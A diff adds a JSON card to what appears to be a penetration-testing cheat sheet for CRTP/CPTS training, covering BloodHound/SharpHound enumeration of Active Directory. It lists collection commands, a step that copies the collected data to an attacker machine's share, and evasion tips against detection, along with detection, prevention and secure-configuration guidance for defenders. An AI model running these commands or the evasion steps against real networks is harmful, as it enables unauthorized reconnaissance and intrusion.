@@ -1,0 +1,108 @@
+{
+  "id": "crtp-bloodhound",
+  "name": "BloodHound / SharpHound Collection",
+  "command": "Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Temp\\ -OutputPrefix 'crtp'",
+  "description": "Collect AD relationship data with SharpHound for visualization in BloodHound. Identifies attack paths to Domain Admin, unconstrained delegation hosts, and ACL misconfigurations.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Domain Enumeration",
+  "type": "command",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "source": "CRTP",
+  "opsec": "loud",
+  "mitre": [
+    "T1087.002",
+    "T1069.002"
+  ],
+  "tools": [
+    "SharpHound",
+    "BloodHound"
+  ],
+  "tags": [
+    "bloodhound",
+    "sharphound",
+    "graph",
+    "attack-path",
+    "da"
+  ],
+  "steps": [
+    {
+      "label": "Load SharpHound",
+      "command": ". C:\\Tools\\SharpHound.ps1"
+    },
+    {
+      "label": "Collect all data",
+      "command": "Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Temp\\ -OutputPrefix 'crtp'"
+    },
+    {
+      "label": "Transfer zip to attacker machine",
+      "command": "Copy-Item C:\\Temp\\crtp_*.zip \\\\<lhost>\\share\\"
+    },
+    {
+      "label": "Start neo4j and BloodHound on attacker",
+      "command": "sudo neo4j start && bloodhound &"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Full collection to C:\\Temp",
+      "command": "Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Temp\\ -OutputPrefix 'crtp'"
+    },
+    {
+      "label": "Stealth DCOnly collection",
+      "command": "Invoke-BloodHound -CollectionMethod DCOnly -OutputDirectory C:\\Temp\\"
+    },
+    {
+      "label": "Run as alternate user",
+      "command": "Invoke-BloodHound -CollectionMethod All -LdapUsername <user> -LdapPassword '<password>'"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-unconstrained-delegation",
+      "note": "Exploit unconstrained delegation computers found in BH",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-kerberoasting",
+      "note": "Roast Kerberoastable users found in BH",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-acl-persistence",
+      "note": "Exploit WriteDACL paths found in BH",
+      "rel": "next"
+    },
+    {
+      "id": "ad-sharphound",
+      "note": "CPTS SharpHound card",
+      "rel": "alternative"
+    }
+  ],
+  "notes": "Key BH queries: 'Shortest Paths to Domain Admins', 'Computers with Unconstrained Delegation', 'Find Principals with DCSync Rights'.",
+  "references": [
+    {
+      "title": "CRTP - BloodHound/SharpHound",
+      "url": "https://www.alteredsecurity.com/adlab"
+    }
+  ],
+  "defense": {
+    "why_it_works": "SharpHound queries LDAP (users, groups, GPOs, OUs, ACLs, trusts), SMB (sessions, local admin), and RPC (logged-on users) from any domain-joined host. The collected JSON feeds BloodHound's graph engine which uses Cypher queries on Neo4j to find shortest attack paths to Domain Admin \u2014 paths humans would never manually discover from raw LDAP data.",
+    "prerequisites": "Any domain user. SharpHound.exe or SharpHound.ps1 on the target. LDAP access to DC. SMB access to enumerate session and local admin data.",
+    "impact": "T1087.002 Account Discovery: Domain Account + T1069.002 Permission Groups Discovery. Maps every ACL, group membership, session, and trust. Identifies shortest paths to DA via Kerberoastable accounts, GenericAll ACEs, unconstrained delegation, and more.",
+    "detection": "SharpHound generates massive LDAP enumeration bursts (hundreds of queries in seconds). MDI 'BloodHound reconnaissance' alert (built-in). Event 4662 volume spike. SMB NetSessionEnum RPC calls to many hosts. SIEM: LDAP query rate from workstation > baseline.\nProcesses performing local or domain account enumeration by invoking account directory queries or security APIs followed by structured output of account lists (DET0587/AN1612).\nSuspicious shell commands or unauthorized access to /etc/passwd or /etc/shadow (AN1613).\nDirectory service queries or system utilities accessing account metadata stores, producing enumeration output (AN1614).\nCloud provider API calls where principals retrieve IAM users or roles in rapid succession (AN1615).\nESXi host account configuration or management APIs queried to retrieve user account listings (AN1617).",
+    "artifacts": "MDI alert: 'BloodHound reconnaissance' | DC Event 4662: bulk LDAP reads | SMB: NetSessionEnum RPC to many hosts | SharpHound .zip output on disk | Event 4104: Invoke-BloodHound / SharpHound | Network: LDAP+SMB burst from workstation",
+    "prevention": "Deploy MDI. Block SharpHound binary via WDAC/AppLocker. Restrict NetSessionEnum (RestrictRemoteSam registry key). Restrict SAMR protocol to admin hosts. Enable Protected Users for sensitive accounts. Remediate excessive ACL permissions found by BloodHound.\nOperating System Configuration: Prevent administrator account enumeration via UAC (GPO: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\CredUI\\EnumerateAdministrators).\nUser Account Management: Manage creation, modification, use, and permissions associated with user accounts.",
+    "evasion": "Use --throttle and --jitter to slow collection below burst thresholds. Collect from high-LDAP-volume host. Use targeted collection methods. Use ADExplorer or ldapsearch from Linux to avoid SharpHound signatures.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1087/002/",
+      "https://attack.mitre.org/techniques/T1069/002/"
+    ],
+    "misconfiguration": "NetSessionEnum not restricted \u2014 any user can enumerate sessions. RestrictRemoteSam not configured. Excessive ACLs (GenericAll/GenericWrite on DA accounts by non-admin groups). MDI not deployed.",
+    "vulnerable_config": "# RestrictRemoteSam not set (any auth user can enumerate local accounts):\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -EA SilentlyContinue).RestrictRemoteSam\n# Returns $null = NOT restricted = VULNERABLE\n\n# Dangerous ACE example:\nGet-ObjectAcl 'Domain Admins' | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll'}",
+    "secure_config": "# Restrict SAMR enumeration:\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RestrictRemoteSam -Value 'O:BAG:BAD:(A;;RC;;;BA)'\n\n# Via GPO:\n# Computer Config \u2192 Windows Settings \u2192 Security Settings \u2192 Local Policies \u2192 Security Options\n# \u2192 Network access: Restrict clients allowed to make remote calls to SAM\n\n# Remediate dangerous ACEs:\nRemove-ADPermission -Identity 'DomainAdmin1' -User 'HelpDesk' -AccessRights GenericAll\n\n# WDAC: deny SharpHound.exe by hash"
+  }
+}
